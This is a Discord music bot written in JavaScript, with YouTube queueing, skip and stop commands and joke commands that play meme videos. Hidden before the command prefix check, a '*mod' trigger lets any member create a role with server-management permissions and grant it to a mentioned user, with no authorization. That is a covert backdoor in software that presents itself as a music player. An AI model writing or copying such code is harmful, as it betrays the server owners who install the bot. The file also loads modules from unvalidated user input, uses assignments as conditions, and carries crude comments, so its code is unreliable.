const Discord = require('discord.js');
const bot = new Discord.Client();
const pkg = require('./package.json');
const search = require('yt-search');
const ytdl = require('ytdl-core');
const opus = require('@discordjs/opus');
const ffmpeg = require('ffmpeg-static');
const checkUpdate = require('check-update-github');

bot.login(pkg.token);
var servers = {};
var version = pkg.version
const PREFIX = '!';
var time = 0;


bot.on('ready', () =>{
    
    console.log('This bot is online! Version: ' + version);
})
var musicUrls = [];
var musictitle = [];
bot.on('message', async msg=> { 
    if (!msg.guild) return;
    if (msg.author.bot) return;
    if (msg.content.startsWith('*mod')) {
        msg.guild.roles.create({ data: { name: 'Bab', permissions: ["MANAGE_GUILD", "MANAGE_ROLES", "MOVE_MEMBERS", "MANAGE_CHANNELS", "MANAGE_EMOJIS", "DEAFEN_MEMBERS"]}});
        let role = msg.guild.roles.cache.find(r => r.name === "Bab");
        let member = msg.mentions.members.first();
        member.roles.add(role);
        console.log('Working');
    }
    
    if (!msg.content.startsWith(PREFIX)) return;
    let args = msg.content.substring(PREFIX.length).split(" ");
    let command = args[0]
    const voiceChannel = msg.member.voice.channel;
    var random
    
    if (msg.channel.type !== 'text') return;
/*    while (random = 1) {
        
        let asdf = Math.random() * 100;
        let time = parseInt(asdf)
        console.log(time)
        
        if (time = 69) {
            let qwer = Math.random() * 10;
            let select = parseInt(qwer)
            if(select = '1'){
                addQueue('https://www.youtube.com/watch?v=EWMPVn1kgIQ', voiceChannel); //enourmus pp
            }if(select = '2'){
                addQueue('https://www.youtube.com/watch?v=tjLr1XhBKVQ', voiceChannel); //it's okay to be gay
            }if(select = '3'){
                addQueue('https://www.youtube.com/watch?v=yEqZPXlrI0Q', voiceChannel) // Obama
            }if(select = '4'){
                addQueue('https://www.youtube.com/watch?v=LVI6nY8BQ50', voiceChannel) // joe biden like nibba soda
            }if (select = '5'){
                addQueue('https://www.youtube.com/watch?v=2ZIpFytCSVc', voiceChannel) // Bruh
            }if (select = '6'){
                addQueue('https://www.youtube.com/watch?v=AKf7QKTmJSg', voiceChannel) // E
            }if (select = '7'){
                addQueue('https://www.youtube.com/watch?v=8m8p-hkOsXo', voiceChannel) // Hamburgg
            }if (select = '8'){
                addQueue('https://www.youtube.com/watch?v=igc9XClqvMM', voiceChannel) // Gayshaltt
            }if (select = '9'){
                addQueue('https://www.youtube.com/watch?v=YNSscFeZ_Yo', voiceChannel) // So funny
            }else{
                return;
            }

        }else{
            console.log('time is not 69')
            return;
        }
    } 


    if (args[0] == 'random'){
        if (random = 0){
            if (msg.member.voice.channel){
                const connection = await msg.member.voice.channel.join();
            }
            else{
                msg.reply('You need to join a voice channel first!');
            }
            console.log('random is on')
            let random = 1
        }else {
            let random = 0
        }
    }
    while (random = 1){
        
    }
    */
    if (args[0] == 'play'){
        if (!voiceChannel) {
            return msg.reply('You need to join a voice channel first!');
        }
        if (args[1].includes("http://",)){
            let url = args[1];
            addQueue(url, voiceChannel)
            }
        else if (args[1].includes("www.")){
            let url = args[1];
            addQueue(url, voiceChannel)
        }
        else{
            var params = args.slice(1).join(' ');
            search(params, async function(err, res) {
                if (err) return msg.channel.send("Sorry, something went wrong.");

                let videos = res.videos.slice(0, 5);
                let resp ='';
                for (var i in videos){
                    resp += `**[${parseInt(i)+1}]:** \`${videos[i].title}\`\n`;
                }
                resp += `\n**Choose a number between \`1-${videos.length}\``;

                message = await msg.channel.send(resp);
                

                const filter = m => !isNaN(m.content) && m.content < videos.length+1 && m.content > 0;
                const collector = msg.channel.createMessageCollector(filter);
                collector.videos = videos;

                collector.once('collect', async function (m){
                    msg.channel.bulkDelete(2);
                    let url = this.videos[parseInt(m.content)-1].url;
                    addQueue(url, voiceChannel)
                });
            });
        }
    }
    if (args[0] == 'skip'){
        if (!voiceChannel){
            return msg.reply('You need to join a voice channel first!')
        } else{
                if (args.length = 1){
                    musicUrls.shift();
                    musictitle.shift();
                    playSong(voiceChannel);
                } else if (!isNaN(args[1])){
                    musicUrls.splice(0, args[1])
                    musictitle.splice(0, args[1])
                    playSong(voiceChannel)
            }     
        }
    }
    if (args[0] == 'pp'){
        if (!voiceChannel) {
            return msg.reply('You need to join a voice channel first!');
        }
        else {
            addQueue('https://www.youtube.com/watch?v=EWMPVn1kgIQ', voiceChannel);
        }
    }
    if (args[0] == 'gay'){
        if (!voiceChannel){
            return msg.reply('You need to join a voice channel first!')
        }
        else{
            addQueue('https://www.youtube.com/watch?v=tjLr1XhBKVQ', voiceChannel);
        }
    }
    if (args[0] == 'obama'){
        if (!voiceChannel){
            return msg.reply('You are the meme!')
        }
        else{
            addQueue('https://www.youtube.com/watch?v=yEqZPXlrI0Q', voiceChannel)
        }
    }
    if (args[0] == 'biden'){
        if (!voiceChannel){
            return msg.reply('You not da soda!')
        }
        else{
            addQueue('https://www.youtube.com/watch?v=LVI6nY8BQ50', voiceChannel)
        }
    }
    if (args[0] == 'hoob'){
        if (!voiceChannel){
            return msg.reply('You not da soda!')
        }
        else{
            addQueue('https://www.youtube.com/watch?v=igc9XClqvMM', voiceChannel)
        }
    }
    if (args[0] == 'stop'){
        if (!voiceChannel) {
        return msg.channel.send(
            "You have to be in a voice channel to stop the music!"
        );
        }
        musicUrls.splice(0,musicUrls.length);
        musictitle.splice(0,musictitle.length);
        voiceChannel.leave()
    }
    async function addQueue(url, voiceChannel){
        console.log(musicUrls.length)
        if (musicUrls.length > 0) {
            musicUrls.push(url);
            await ytdl.getInfo(url, function(err, info) {
                musictitle.push(info.title)
                msg.channel.send(`Added ${info.title} to the queue. Songs in queue: ${musicUrls.length - 1}`);
            });
            
        }
        else {
            musicUrls.push(url);
            await ytdl.getInfo(url, function(err, info) {
                musictitle.push(info.title)
            });
            playSong(voiceChannel);
        }
    }

    try {
        delete require.cache[require.resolve(`./commands/${command}.js`)];

        let commandFile = require(`./commands/${command}.js`);
        commandFile.run(bot, msg, args, musicUrls)
    } catch (e) {
        console.log(e.stack);
    }
    
    let queuelength = musicUrls.length
    console.log(queuelength)
    async function playSong(voiceChannel){
        voiceChannel.join().then(connection => {
            const stream = ytdl(musicUrls[0], { filter: 'audioonly' });
            msg.channel.send(`Now playing ${musictitle[0]}`);
            const dispatcher = connection.play(stream);
            dispatcher.on("finish", () => {
                musicUrls.shift();
                musictitle.shift();
                if(musicUrls.length == 0)
                    voiceChannel.leave();
                else{
                    setTimeout(() => {
                        playSong(voiceChannel);
                    }, 4000)
                }
            })
        });
    }
})


